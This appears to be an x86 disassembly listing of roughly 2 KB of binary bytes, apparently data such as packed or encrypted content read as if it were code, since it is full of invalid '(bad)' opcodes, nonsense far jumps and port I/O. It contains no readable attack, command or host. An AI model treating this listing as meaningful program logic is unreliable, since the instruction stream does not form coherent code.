  418b0f:	xor    al,0x7e
  418b11:	inc    ecx
  418b12:	ror    ah,cl
  418b14:	(bad)  
  418b15:	cmp    edi,ebp
  418b17:	sub    DWORD PTR [ebx+eax*1],edi
  418b1a:	inc    esi
  418b1b:	scas   eax,DWORD PTR es:[edi]
  418b1c:	adc    DWORD PTR [eax-0x6d],0x28
  418b20:	int3   
  418b21:	popf   
  418b22:	mov    al,ds:0x3f2cba81
  418b27:	hlt    
  418b28:	add    al,dh
  418b2a:	adc    ecx,DWORD PTR [edx+0x53c79efd]
  418b30:	pusha  
  418b31:	mov    eax,ds:0x31e0b7bb
  418b36:	ja     0x418b73
  418b38:	mov    ebx,0x1f79c490
  418b3d:	xchg   ebp,eax
  418b3e:	addr16 add ch,dl
  418b41:	(bad)  
  418b43:	out    0xed,eax
  418b45:	xchg   esi,eax
  418b46:	mov    ebp,0x6eec4348
  418b4b:	or     DWORD PTR [eax-0x71],ecx
  418b4e:	push   ss
  418b4f:	mov    esi,0x30b345e
  418b54:	xchg   ecx,eax
  418b55:	push   cs
  418b56:	daa    
  418b57:	fld    TBYTE PTR [edi-0x48]
  418b5a:	mov    ebx,0xc0c83c8f
  418b5f:	mov    eax,ds:0xd9351c36
  418b64:	(bad)  
  418b65:	xchg   esi,eax
  418b66:	xchg   BYTE PTR [esi],cl
  418b68:	popa   
  418b69:	dec    edi
  418b6a:	in     eax,dx
  418b6b:	dec    ebx
  418b6c:	inc    esp
  418b6d:	les    ebp,FWORD PTR [edx+0x46]
  418b70:	cmp    eax,0x28b2c16b
  418b75:	and    bl,ah
  418b77:	mov    ecx,0xaa6dab04
  418b7c:	sbb    esp,0x5cdc0a99
  418b82:	sub    ecx,ebx
  418b84:	pop    esp
  418b85:	xchg   edx,eax
  418b86:	mov    ebx,0x6f2bf40d
  418b8b:	out    dx,eax
  418b8c:	cli    
  418b8d:	and    al,0x56
  418b8f:	mov    BYTE PTR [esi],al
  418b91:	(bad)  
  418b92:	fisttp WORD PTR [esi+ebp*4+0xe]
  418b96:	pushf  
  418b97:	popf   
  418b98:	call   0x9e81:0x88bc
  418b9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b9f:	pop    ss
  418ba0:	xor    al,BYTE PTR [eax+0x66733e97]
  418ba6:	mov    ebp,DWORD PTR [edi]
  418ba8:	daa    
  418ba9:	pop    ebp
  418baa:	repnz mov bl,0xe8
  418bad:	jmp    0xb025:0xad913eb7
  418bb4:	xor    eax,0x88274fa
  418bb9:	xchg   ebp,eax
  418bba:	adc    BYTE PTR [esi+edi*4+0x50],bh
  418bbe:	cmp    al,0xff
  418bc0:	daa    
  418bc1:	sub    DWORD PTR [edi-0x77cef99b],esi
  418bc7:	daa    
  418bc8:	or     edi,DWORD PTR [eax]
  418bca:	(bad)  
  418bcb:	es sahf 
  418bcd:	inc    eax
  418bce:	mov    ecx,0xea0f1720
  418bd3:	fwait
  418bd4:	dec    eax
  418bd5:	data16 fs loopne 0x418c51
  418bd9:	mov    BYTE PTR [ecx],ch
  418bdb:	and    ah,bl
  418bdd:	inc    ecx
  418bde:	mov    DWORD PTR [ecx-0x6f4779e6],0xccb2bf0e
  418be8:	jne    0x418c1a
  418bea:	scas   eax,DWORD PTR es:[edi]
  418beb:	push   ecx
  418bec:	(bad)  
  418bed:	fs clc 
  418bef:	stc    
  418bf0:	adc    eax,0xe5e91020
  418bf5:	out    0x1,eax
  418bf7:	aad    0x62
  418bf9:	lahf   
  418bfa:	mov    WORD PTR [esp+esi*1+0x74d6b400],?
  418c01:	pop    ss
  418c02:	fs pusha 
  418c04:	mov    ds:0xdb1886f2,eax
  418c09:	cli    
  418c0a:	xor    bh,BYTE PTR [esi+0x76df540e]
  418c10:	inc    ebp
  418c11:	les    ebp,FWORD PTR [ebx]
  418c13:	popa   
  418c14:	lods   eax,DWORD PTR ds:[esi]
  418c15:	push   eax
  418c16:	inc    ebp
  418c17:	push   esi
  418c18:	jb     0x418c99
  418c1a:	into   
  418c1b:	push   ebx
  418c1c:	fiadd  WORD PTR [ebp-0x3d]
  418c1f:	add    al,0xf4
  418c21:	and    al,0x0
  418c23:	or     ecx,DWORD PTR [eax+ebp*8-0x72526315]
  418c2a:	xchg   ecx,eax
  418c2b:	pop    ds
  418c2c:	(bad)  
  418c2d:	out    0x5a,al
  418c2f:	push   ebx
  418c30:	data16 sub bl,BYTE PTR ds:0xe5acbb04
  418c37:	fmul   QWORD PTR [edi]
  418c39:	cmp    dh,BYTE PTR [edi+ebx*2+0x1b]
  418c3d:	mov    eax,ds:0x818a66b6
  418c42:	fsub   DWORD PTR [edi]
  418c44:	push   esp
  418c45:	or     eax,0x7c6e68c4
  418c4a:	fisub  WORD PTR [eax-0x6201fb1]
  418c50:	rcr    BYTE PTR [ecx+0x3f3e2ff2],1
  418c56:	clc    
  418c57:	mov    ds:0xad333282,al
  418c5c:	add    ebp,0xfffffff6
  418c5f:	or     edx,DWORD PTR [ecx+0x176adf7a]
  418c65:	cmp    DWORD PTR [ebx-0x64a0bc62],ecx
  418c6b:	(bad)  
  418c6d:	jmp    0x12de:0x24945d0c
  418c74:	lods   al,BYTE PTR ds:[esi]
  418c75:	imul   edi,DWORD PTR [esi+eax*8-0x30],0x5d
  418c7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c7b:	test   al,0x80
  418c7d:	fcom   QWORD PTR [eax+0x30]
  418c80:	test   DWORD PTR [eax-0x31],ebx
  418c83:	or     dl,BYTE PTR [esi+0x76626b76]
  418c89:	ss jle 0x418c89
  418c8c:	xor    al,BYTE PTR [edx-0x152f96ed]
  418c92:	ja     0x418c1a
  418c94:	mov    WORD PTR [ebp+0x2568e2aa],gs
  418c9a:	xor    eax,0x65d63308
  418c9f:	ins    DWORD PTR es:[edi],dx
  418ca0:	push   esi
  418ca1:	shl    DWORD PTR [edi+edx*2+0x5424390e],1
  418ca8:	repnz fs mov esi,0x2f938a57
  418caf:	cmp    eax,0xc1c955df
  418cb4:	pop    edi
  418cb5:	shl    eax,1
  418cb7:	aaa    
  418cb8:	out    0x5b,al
  418cba:	push   ecx
  418cbb:	add    al,0x53
  418cbd:	daa    
  418cbe:	pop    ecx
  418cbf:	sub    DWORD PTR [eax-0x8b37fd5],edx
  418cc5:	inc    ebp
  418cc6:	shl    DWORD PTR [edx+0x10],cl
  418cc9:	xchg   BYTE PTR [ecx+0x30d77af9],bl
  418ccf:	push   eax
  418cd0:	cld    
  418cd1:	(bad)  
  418cd2:	cmp    cl,ah
  418cd4:	cmp    BYTE PTR [edi-0x55],0x31
  418cd8:	pop    esi
  418cd9:	call   0xc976:0xe469ab7b
  418ce0:	mov    ds:0xab350e2e,al
  418ce5:	test   eax,0x6f979538
  418cea:	test   DWORD PTR [ebx-0x3b7c579d],0x18ab48cc
  418cf4:	clc    
  418cf5:	fwait
  418cf6:	ds popa 
  418cf8:	in     al,0xe4
  418cfa:	iret   
  418cfb:	(bad)  
  418cfc:	cmc    
  418cfd:	sub    al,0xdd
  418cff:	ret    
  418d00:	lods   eax,DWORD PTR ds:[esi]
  418d01:	inc    eax
  418d02:	mov    eax,0x494cc911
  418d07:	loop   0x418cd2
  418d09:	mov    ah,BYTE PTR [ebp-0x757846ed]
  418d0f:	push   edx
  418d10:	neg    esp
  418d12:	scas   al,BYTE PTR es:[edi]
  418d13:	arpl   si,ax
  418d15:	mov    al,ds:0xfb82b697
  418d1a:	cs je  0x418d61
  418d1d:	ds repz inc ebx
  418d20:	jns    0x418d9c
  418d22:	imul   DWORD PTR [ebx-0x1]
  418d25:	jne    0x418d4e
  418d27:	call   0x5204:0x43a70fbd
  418d2e:	add    al,0xa8
  418d30:	mov    cl,0xc5
  418d32:	adc    BYTE PTR [esi+0x6e80a9a6],bh
  418d38:	daa    
  418d39:	mov    cl,0x5
  418d3b:	cmp    al,0x15
  418d3d:	pop    ss
  418d3e:	sbb    eax,DWORD PTR [bx-0x37]
  418d42:	iret   
  418d43:	add    esp,DWORD PTR [ecx-0x5a]
  418d46:	stos   DWORD PTR es:[edi],eax
  418d47:	pushf  
  418d48:	scas   al,BYTE PTR es:[edi]
  418d49:	fldcw  WORD PTR [eax+0x3b4b79a0]
  418d4f:	aaa    
  418d50:	push   esi
  418d51:	adc    edi,DWORD PTR [ebp-0x10bdd33d]
  418d57:	cs push cs
  418d59:	adc    eax,0xcde24a5
  418d5e:	je     0x418d19
  418d60:	xor    al,0x15
  418d62:	scas   eax,DWORD PTR es:[edi]
  418d63:	pushf  
  418d64:	jl     0x418d2c
  418d66:	sti    
  418d67:	sub    al,0x2e
  418d69:	std    
  418d6a:	adc    al,ah
  418d6c:	scas   al,BYTE PTR es:[edi]
  418d6d:	mov    cl,0xce
  418d6f:	pop    ss
  418d70:	push   edx
  418d71:	fisub  DWORD PTR [esi+ebp*4]
  418d74:	adc    al,0x82
  418d76:	cdq    
  418d77:	add    DWORD PTR [edx-0x2b],ecx
  418d7a:	stos   BYTE PTR es:[edi],al
  418d7b:	idiv   DWORD PTR [bp+di]
  418d7e:	call   0x9caf:0x684bbc6f
  418d85:	xchg   esp,eax
  418d86:	pop    edi
  418d87:	and    BYTE PTR [eax+ebx*8],bl
  418d8a:	jae    0x418d44
  418d8c:	lahf   
  418d8d:	sbb    bh,BYTE PTR ds:0x8705c81b
  418d93:	mov    cl,0x97
  418d95:	xchg   ebx,eax
  418d96:	ins    BYTE PTR es:[edi],dx
  418d97:	arpl   WORD PTR [edi-0x6b72f6b5],ax
  418d9d:	sbb    eax,0x194ad52
  418da2:	adc    eax,0xed9c258e
  418da7:	mov    edi,0x84debd52
  418dac:	dec    edi
  418dad:	inc    eax
  418dae:	call   0xb86c:0x367d7e2d
  418db5:	test   al,0xec
  418db7:	mov    dl,0xb1
  418db9:	scas   eax,DWORD PTR es:[edi]
  418dba:	sub    DWORD PTR [esi-0x30ce9485],0xb6c21ea0
  418dc4:	sub    bl,bl
  418dc6:	repnz dec esp
  418dc8:	cmp    ch,bh
  418dca:	mov    edi,0xf7b52f68
  418dcf:	xchg   esi,eax
  418dd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dd1:	ror    DWORD PTR [eax],0x24
  418dd4:	mov    dh,0xe5
  418dd6:	into   
  418dd7:	sahf   
  418dd8:	mov    edx,0x3da06584
  418ddd:	and    DWORD PTR [esi-0x37b80373],ebx
  418de3:	(bad)  
  418de4:	fistp  WORD PTR [edi]
  418de6:	cmp    eax,0xf1780633
  418deb:	fcomp  st(0)
  418ded:	ds jle 0x418d9f
  418df0:	xor    bh,0x66
  418df3:	das    
  418df4:	stos   DWORD PTR es:[edi],eax
  418df5:	mov    BYTE PTR [ebx-0x20],dl
  418df8:	out    0x8f,eax
  418dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dfb:	maskmovq mm7,mm7
  418dfe:	shl    BYTE PTR [esi-0x34edea63],1
  418e04:	stos   BYTE PTR es:[edi],al
  418e05:	jp     0x418dd7
  418e07:	and    ecx,0x35
  418e0a:	hlt    
  418e0b:	inc    esi
  418e0c:	pop    ss
  418e0d:	cdq    
  418e0e:	fild   WORD PTR [ecx+0x3610187]
  418e14:	xor    eax,0xd1e9cbd0
  418e19:	sub    ebp,ecx
  418e1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e1c:	and    al,0x86
  418e1e:	push   esp
  418e1f:	ds pushf 
  418e21:	mov    al,ds:0x5868f616
  418e26:	xchg   ebp,eax
  418e27:	test   al,dh
  418e29:	retf   
  418e2a:	scas   eax,DWORD PTR es:[edi]
  418e2b:	loopne 0x418ea4
  418e2d:	daa    
  418e2e:	fcmovu st,st(7)
  418e30:	enter  0xa5dd,0xc1
  418e34:	out    dx,al
  418e35:	std    
  418e36:	xor    bl,BYTE PTR [eax-0x9]
  418e39:	jp     0x418dc3
  418e3b:	mov    ds:0xca0185c8,al
  418e40:	ret    0x1bfb
  418e43:	sar    DWORD PTR [edi+0x2ec1fa7c],cl
  418e49:	adc    eax,0xf6943a2e
  418e4e:	ret    0x5597
  418e51:	mov    ch,BYTE PTR [ebp+0x42513235]
  418e57:	jecxz  0x418e11
  418e59:	repz dec eax
  418e5b:	fcomp  QWORD PTR [edi+0xb]
  418e5e:	inc    edi
  418e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e60:	or     al,0x4c
  418e62:	add    bl,BYTE PTR [esi+0x46]
  418e65:	out    0xf1,eax
  418e67:	cld    
  418e68:	sbb    BYTE PTR [ebp-0x7a],0x8f
  418e6c:	cmp    ax,0x173a
  418e70:	mov    ds:0x6e545147,al
  418e75:	scas   al,BYTE PTR es:[edi]
  418e76:	clc    
  418e77:	dec    esp
  418e78:	aas    
  418e79:	lahf   
  418e7a:	add    eax,0x8aacbf47
  418e7f:	xchg   ecx,eax
  418e80:	xchg   edx,eax
  418e81:	in     al,0xd
  418e83:	imul   edx,DWORD PTR [esi-0x5fe33442],0x1e
  418e8a:	inc    eax
  418e8b:	cmp    eax,0x81ac8952
  418e90:	rcr    DWORD PTR [esi+0x4c],1
  418e93:	push   ecx
  418e94:	fcmovbe st,st(7)
  418e96:	aas    
  418e97:	(bad)  
  418e98:	arpl   WORD PTR [edx+0x57],ax
  418e9b:	jmp    0xd96d:0xa557a119
  418ea2:	or     al,BYTE PTR [edi]
  418ea4:	das    
  418ea5:	mov    dl,0x19
  418ea7:	add    al,0xcd
  418ea9:	xchg   ebx,eax
  418eaa:	push   es
  418eab:	inc    edx
  418eac:	cli    
  418ead:	sbb    edx,edx
  418eaf:	lock test dh,ah
  418eb2:	lods   al,BYTE PTR ds:[esi]
  418eb3:	mov    esp,0x94c358c1
  418eb8:	adc    esp,ebx
  418eba:	sbb    DWORD PTR [edi+eiz*4+0x1d88835a],edx
  418ec1:	add    esi,DWORD PTR [ecx-0xeace6f5]
  418ec7:	xor    al,0x81
  418ec9:	fnstsw WORD PTR [ecx+0x14]
  418ecc:	mov    ds:0xe14fc553,al
  418ed1:	xchg   esp,eax
  418ed2:	repz out 0x4a,eax
  418ed5:	pop    ecx
  418ed6:	adc    al,0x73
  418ed8:	xor    DWORD PTR [ebp-0x3c3eb5da],eax
  418ede:	add    eax,0x1932d43
  418ee3:	fldcw  WORD PTR [ebx]
  418ee5:	add    eax,0x2ec0e6b0
  418eea:	sub    ah,BYTE PTR [ebp+0x1097ffdf]
  418ef0:	xchg   esi,eax
  418ef1:	lds    ebp,FWORD PTR [edi+0x1b]
  418ef4:	out    dx,eax
  418ef5:	fmul   DWORD PTR [eax-0x26]
  418ef8:	mov    bh,0xf7
  418efa:	adc    eax,0xe6c6af4d
  418eff:	popa   
  418f00:	das    
  418f01:	mov    esi,ecx
  418f03:	xchg   edx,eax
  418f04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f05:	lea    edx,[edi]
  418f07:	iret   
  418f08:	rcl    ah,1
  418f0a:	xchg   esi,eax
  418f0b:	add    al,0xa2
  418f0d:	adc    eax,0xfe883da4
  418f12:	ret    
  418f13:	stc    
  418f14:	ror    DWORD PTR [eax],0xb4
  418f17:	daa    
  418f18:	cwde   
  418f19:	or     BYTE PTR [edi],dl
  418f1b:	dec    edi
  418f1c:	test   DWORD PTR [esi+0x3e],ecx
  418f1f:	icebp  
  418f20:	loop   0x418f80
  418f22:	jbe    0x418f09
  418f24:	in     al,dx
  418f25:	cmc    
  418f26:	je     0x418eeb
  418f28:	jnp    0x418f80
  418f2a:	mov    eax,0x6c116062
  418f2f:	sti    
  418f30:	jp     0x418f4f
  418f32:	hlt    
  418f33:	cdq    
  418f34:	(bad)  
  418f35:	ja     0x418f29
  418f37:	out    0x74,eax
  418f39:	jecxz  0x418f0f
  418f3b:	inc    esi
  418f3c:	ins    DWORD PTR es:[edi],dx
  418f3d:	pop    ebp
  418f3e:	dec    esp
  418f3f:	mov    cl,0x4f
  418f41:	in     eax,0xc0
  418f43:	cs xor dh,0xcd
  418f47:	in     al,0x3
  418f49:	daa    
  418f4a:	mov    ds:0x9eec793,al
  418f4f:	cmp    bh,0x3
  418f52:	fdiv   st,st(4)
  418f54:	cdq    
  418f55:	in     al,0x4a
  418f57:	mov    edx,0x906d87f9
  418f5c:	xchg   ebx,eax
  418f5d:	xchg   edx,eax
  418f5e:	push   ebx
  418f5f:	adc    ecx,DWORD PTR [esi-0x32ca1a9f]
  418f65:	in     al,dx
  418f66:	or     eax,0x36d53c65
  418f6b:	inc    eax
  418f6c:	pop    ds
  418f6d:	retf   
  418f6e:	loopne 0x418fb1
  418f70:	xchg   BYTE PTR [esi+0x2f],bh
  418f73:	jne    0x418f43
  418f75:	mov    DWORD PTR [ecx],edi
  418f77:	arpl   WORD PTR [ecx+eiz*2-0x77b30a4c],ax
  418f7e:	mov    bl,0x5e
  418f80:	mov    esp,0x69a8f469
  418f85:	aad    0xbe
  418f87:	xchg   edi,eax
  418f88:	arpl   WORD PTR [ebx+0x5c],di
  418f8b:	cld    
  418f8c:	data16 mov BYTE PTR [eax+0x59],0x61
  418f91:	mov    ds:0x4502412b,al
  418f96:	std    
  418f97:	cmp    eax,0xf7f8f606
  418f9c:	mov    al,ds:0xcb6814e9
  418fa1:	out    dx,al
  418fa2:	stos   BYTE PTR es:[edi],al
  418fa3:	fwait
  418fa4:	ins    BYTE PTR es:[edi],dx
  418fa5:	nop
  418fa6:	lods   eax,DWORD PTR ds:[esi]
  418fa7:	dec    edx
  418fa8:	rol    DWORD PTR [ebx-0x6ce3f84e],1
  418fae:	shl    al,1
  418fb0:	sbb    ecx,DWORD PTR [ebx]
  418fb2:	or     edi,0xffffffdf
  418fb5:	(bad)  
  418fb6:	in     al,dx
  418fb7:	icebp  
  418fb8:	fist   DWORD PTR [eax-0x74b429eb]
  418fbe:	or     edi,esp
  418fc0:	inc    eax
  418fc1:	mov    eax,ds:0x6450176c
  418fc6:	stc    
  418fc7:	sub    ch,bl
  418fc9:	(bad)  
  418fca:	pop    eax
  418fcb:	mov    ebp,DWORD PTR [eax-0x67ca8856]
  418fd1:	sub    bh,BYTE PTR [ebp-0x1dc25cfc]
  418fd7:	mov    edi,0x7b18e3cd
  418fdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fdd:	mov    eax,0x2d18d9dd
  418fe2:	retf   
  418fe3:	cdq    
  418fe4:	adc    esp,DWORD PTR [ebx]
  418fe6:	(bad)  
  418fe7:	in     al,0x7c
  418fe9:	jnp    0x41901d
  418feb:	inc    ecx
  418fec:	ror    bh,0x2
  418fef:	mov    al,0x63
  418ff1:	pop    edi
  418ff2:	out    dx,al
  418ff3:	mov    bl,0x3
  418ff5:	in     al,0xee
  418ff7:	jg     0x419045
  418ff9:	mov    ah,0x1
  418ffb:	fmul   st(2),st
  418ffd:	outs   dx,BYTE PTR ds:[esi]
  418ffe:	sub    BYTE PTR [ebp+0x47],ch
  419001:	add    eax,0xbdaddb18
  419006:	leave  
  419007:	js     0x419056
  419009:	outs   dx,BYTE PTR ds:[esi]
  41900a:	push   esp
  41900b:	and    DWORD PTR [ebx+0x26a0b924],ebp
  419011:	(bad)  
  419012:	scas   al,BYTE PTR es:[edi]
  419013:	push   esp
  419014:	mov    eax,es:0x90e5d642
  41901a:	cmp    al,BYTE PTR [edi+eiz*4-0x32]
  41901e:	ins    DWORD PTR es:[edi],dx
  41901f:	dec    DWORD PTR ds:0x986974fb
  419025:	pusha  
  419026:	mov    esi,0x39d9cbaf
  41902b:	lods   eax,DWORD PTR ds:[esi]
  41902c:	gs jnp 0x41907b
  41902f:	xchg   edx,eax
  419030:	and    ebp,edi
  419032:	icebp  
  419033:	addr16 (bad) 
  419035:	js     0x418fe2
  419037:	in     eax,dx
  419038:	cwde   
  419039:	pop    edx
  41903a:	iret   
  41903b:	retf   
  41903c:	ins    DWORD PTR es:[edi],dx
  41903d:	sbb    cl,BYTE PTR [ebx+0x52]
  419040:	inc    esi
  419041:	jecxz  0x41900c
  419043:	addr16 or dl,dl
  419046:	or     al,0xcb
  419048:	mov    dh,BYTE PTR [ecx-0x64cc1b8f]
  41904e:	into   
  41904f:	pop    edi
  419050:	call   0x7562:0x420f0a4
  419057:	and    BYTE PTR [ebx+0x5457a9d7],bl
  41905d:	rol    BYTE PTR [eax-0x68],0xcf
  419061:	xchg   BYTE PTR [edi+0x43],bl
  419064:	test   al,0x15
  419066:	stos   BYTE PTR es:[edi],al
  419067:	enter  0x696,0x6f
  41906b:	sbb    al,0x9e
  41906d:	xlat   BYTE PTR ds:[ebx]
  41906e:	cli    
  41906f:	loope  0x418fff
  419071:	pop    ebp
  419072:	jl     0x419084
  419074:	push   esi
  419075:	outs   dx,BYTE PTR ds:[esi]
  419076:	jnp    0x4190a6
  419078:	ds nop
  41907a:	icebp  
  41907b:	stos   BYTE PTR es:[edi],al
  41907c:	je     0x419093
  41907e:	add    eax,0xf46f64e2
  419083:	cs arpl si,bp
  419086:	shr    DWORD PTR [edx-0x24],0xa
  41908a:	cwde   
  41908b:	and    ebp,DWORD PTR [eax+0x4d02558d]
  419091:	pop    edx
  419092:	inc    ecx
  419093:	fcmovnb st,st(6)
  419095:	adc    DWORD PTR [edx-0xb],edi
  419098:	jne    0x41905d
  41909a:	add    eax,0x40a8985e
  41909f:	(bad)  
  4190a0:	or     eax,0x865bde1
  4190a5:	aam    0xf9
  4190a7:	pop    eax
  4190a8:	jmp    0x41905e
  4190aa:	pop    eax
  4190ab:	push   es
  4190ac:	xchg   esp,eax
  4190ad:	mov    eax,0x54a1a7db
  4190b2:	or     ebx,DWORD PTR [esi-0x399118f8]
  4190b8:	inc    ecx
  4190b9:	cwde   
  4190ba:	fwait
  4190bb:	and    al,0xb2
  4190bd:	shl    BYTE PTR [ecx+0x148fc8b8],0x2
  4190c4:	mov    al,dh
	...
  41929a:	shr    ah,cl
  41929c:	and    edx,DWORD PTR [ecx]
  41929e:	aas    
  41929f:	fcomip st,st(2)
  4192a1:	out    dx,eax
  4192a2:	or     DWORD PTR [esi+0x5a3beacd],ebp
  4192a8:	adc    DWORD PTR [eax+0x1cce3],esi
  4192ae:	and    al,BYTE PTR [edi]
  4192b0:	add    BYTE PTR [eax],al
  4192b2:	mov    ds:0x4aba4d27,al
  4192b7:	retf   
  4192b8:	jae    0x419259
  4192ba:	out    0xbf,eax
  4192bc:	mov    DWORD PTR [eax],ecx
  4192be:	in     al,dx
  4192bf:	sub    eax,DWORD PTR [esp+ebx*1]
  4192c2:	jge    0x41924b
  4192c4:	data16 jno 0x4192c4
  4192c7:	mov    ebx,0xbe9c56db
  4192cc:	loope  0x419305
  4192ce:	xor    al,0x42
  4192d0:	mov    ds:0x76594c4a,al
  4192d5:	out    dx,al
  4192d6:	dec    esi
  4192d7:	hlt    
  4192d8:	mov    es,WORD PTR [esi+eax*2]
  4192db:	fstp   DWORD PTR [edi+0x61]
  4192de:	outs   dx,DWORD PTR ds:[esi]
  4192df:	jp     0x419359
  4192e1:	and    DWORD PTR [eax-0x52aaefca],0x69
  4192e8:	lock or eax,0xaecd16c8
  4192ee:	sub    BYTE PTR [esp+edi*4],0xdc
  4192f2:	push   0xfd41626f
  4192f7:	in     eax,dx
  4192f8:	sti    
  4192f9:	fstp   DWORD PTR [esi+0x8]
  4192fc:	mov    dl,0xa1
  4192fe:	mov    ds:0xf94c7f0f,eax
  419303:	mov    ds:0x53ac33d,eax
  419308:	inc    cx
  41930a:	dec    ecx
  41930b:	mov    ah,0x2f
  41930d:	adc    esi,esp
  41930f:	lea    ebx,[ebp+ebp*1+0x2f]
  419313:	xchg   DWORD PTR [edi-0x3b8fcfbb],edi
  419319:	cmp    ebx,DWORD PTR [edx+0x4c]
  41931c:	sub    BYTE PTR ds:0xf9b2b36d,dh
  419322:	rol    edx,1
  419324:	int    0x60
  419326:	scas   eax,DWORD PTR es:[edi]
  419327:	push   0xffffffc2
  419329:	dec    ebx
  41932a:	fsub   QWORD PTR [esi]
  41932c:	pushf  
  41932d:	sbb    al,0xfa
  41932f:	push   edx
  419330:	or     edi,DWORD PTR [ebx]
  419332:	imul   eax,DWORD PTR [edi],0x48
  419335:	xchg   esi,eax
  419336:	jp     0x419323
  419338:	bound  ebx,QWORD PTR gs:[eax-0x2682d363]
  41933f:	pusha  
  419340:	pop    edi
  419341:	inc    edi
  419342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419343:	jmp    0xbb4382d8
  419348:	ret    0x5d03
  41934b:	sub    esi,DWORD PTR [esi-0x5e4e43b8]
  419351:	mov    dl,0x2f
  419353:	aad    0x5e
  419355:	jl     0x4192de
  419357:	aaa    
  419358:	mov    ebx,0xc44781a
  41935d:	sbb    eax,0x9a4fbd36
  419362:	cmp    bl,BYTE PTR [edx+eax*4+0x3b15b12d]
  419369:	cmp    eax,DWORD PTR [ebp+0x110dff9d]
  41936f:	push   ecx
  419370:	jne    0x4193a5
  419372:	fild   DWORD PTR ds:0xe6c5af9f
  419378:	les    ecx,FWORD PTR [ebx]
  41937a:	push   ebp
  41937b:	cmp    DWORD PTR [edx-0x6e],ebx
  41937e:	push   es
  41937f:	out    dx,eax
  419380:	xchg   edi,eax
  419381:	or     DWORD PTR [eax-0x76],ebx
  419384:	fsubr  QWORD PTR [ecx+0xd]
  419387:	aam    0x6c
  419389:	adc    DWORD PTR [esi],ebp
  41938b:	leave  
  41938c:	fs mov bh,0xf3
  41938f:	add    esi,DWORD PTR [eax]
  419391:	sbb    al,0xde
  419393:	inc    ebx
  419394:	sub    DWORD PTR [esp+edi*1],esp
  419397:	lods   al,BYTE PTR ds:[esi]
  419398:	mov    edi,0x9a565048
  41939d:	imul   ebp,DWORD PTR [esi],0xe31a600
  4193a3:	loopne 0x41933e
  4193a5:	mov    esi,0x271b9d30
  4193aa:	jp     0x4193b9
  4193ac:	jl     0x419412
  4193ae:	jo     0x41934a
  4193b0:	rol    BYTE PTR [eax+0x47],cl
  4193b3:	rol    dl,0x77
  4193b6:	in     eax,0x53
  4193b8:	fldcw  WORD PTR [ecx+0x3598c9d5]
  4193be:	(bad)  
  4193bf:	stc    
  4193c0:	in     al,dx
  4193c1:	loopne 0x419427
  4193c3:	inc    esi
  4193c4:	rcl    BYTE PTR [esi+0x46],0xda
  4193c8:	push   esi
  4193c9:	in     eax,dx
  4193ca:	mov    al,0xb7
  4193cc:	sti    
  4193cd:	jne    0x419364
  4193cf:	add    DWORD PTR [ecx-0x6a08057c],ecx
  4193d5:	stc    
  4193d6:	ds xor al,0x74
  4193d9:	or     BYTE PTR [edi],ah
  4193db:	rcr    bh,0x12
  4193de:	shl    BYTE PTR [edx+0x249789b6],0x61
  4193e5:	repz ret 0xccc
  4193e9:	dec    edx
  4193ea:	add    eax,0xda8fa6b6
  4193ef:	lahf   
  4193f0:	xor    ebx,ebp
  4193f2:	push   0xa5d2b739
  4193f7:	mov    edi,0x8a6690fd
  4193fc:	push   edx
  4193fd:	sbb    dh,BYTE PTR [esp+eax*2+0x2f]
  419401:	add    edi,DWORD PTR [ebx]
  419403:	adc    ebx,DWORD PTR [edx-0x5d]
  419406:	nop
  419407:	retf   0x6bd3
  41940a:	jne    0x419394
  41940c:	nop
  41940d:	pop    ecx
  41940e:	pop    ecx
  41940f:	pushfw 
  419411:	and    al,0xd7
  419413:	mov    cl,0x8f
  419415:	loop   0x41942c
  419417:	sub    eax,0xa097f6cb
  41941c:	iret   
  41941d:	leave  
  41941e:	push   0x551beb48
  419423:	(bad)  
  419424:	out    0xa3,al
  419426:	mov    ch,0x0
  419428:	pop    ss
  419429:	xlat   BYTE PTR ds:[ebx]
  41942a:	adc    dh,BYTE PTR [ebp-0x7]
  41942d:	mov    WORD PTR [ebp-0x35],cs
  419430:	lahf   
  419431:	sbb    eax,0x44118dc2
  419436:	xor    dh,BYTE PTR [edi-0x6b]
  419439:	add    al,0xfd
  41943b:	xor    al,0x8a
  41943d:	and    edx,ecx
  41943f:	loopne 0x4194a6
  419441:	jmp    0x8198:0x9f0c003c
  419448:	xor    eax,0xb92de017
  41944d:	(bad)  
  41944e:	mov    ds:0x3ad9f57b,al
  419453:	cmp    dl,BYTE PTR [edx+edx*8+0x73669506]
  41945a:	aas    
  41945b:	push   ds
  41945c:	push   ecx
  41945d:	aad    0x3f
  41945f:	mov    bh,0xbc
  419461:	mov    ebx,0x15774986
  419466:	sbb    al,0x1f
  419468:	call   0xbb84fba7
  41946d:	push   ebx
  41946f:	adc    al,0x2f
  419471:	out    dx,eax
  419472:	aas    
  419473:	outs   dx,DWORD PTR ds:[esi]
  419474:	loopne 0x41943e
  419476:	mov    ah,0x82
  419478:	ins    DWORD PTR es:[edi],dx
  419479:	daa    
  41947a:	or     eax,0xe5acecf9
  41947f:	aas    
  419480:	xchg   DWORD PTR [edx+0x7becee19],ecx
  419486:	mov    fs,WORD PTR [ebx]
  419488:	or     cl,BYTE PTR [ebx+0x29f1b0d9]
  41948e:	dec    edx
  41948f:	js     0x41950c
  419491:	(bad)
  419494:	call   0x44d:0x32735236
  41949b:	push   cs
  41949c:	fadd   DWORD PTR [edi]
  41949e:	test   DWORD PTR [edi-0x4c],ebp
  4194a1:	jg     0x4194c6
  4194a3:	(bad)  
  4194a4:	stos   DWORD PTR es:[edi],eax
  4194a5:	dec    ebx
  4194a6:	addr16 retf 0x34fc
  4194aa:	popf   
  4194ab:	or     al,0xc4
  4194ad:	repnz push 0x810d7c4b
  4194b3:	dec    esp
  4194b4:	xchg   ecx,eax
  4194b5:	cs sbb edi,0xffffffbd
  4194b9:	mov    eax,0xa57bf3c1
  4194be:	loopne 0x4194e1
  4194c0:	ds out 0x5e,al
  4194c3:	push   es
  4194c4:	adc    DWORD PTR [ebx],0x4743dbb3
  4194ca:	retf   
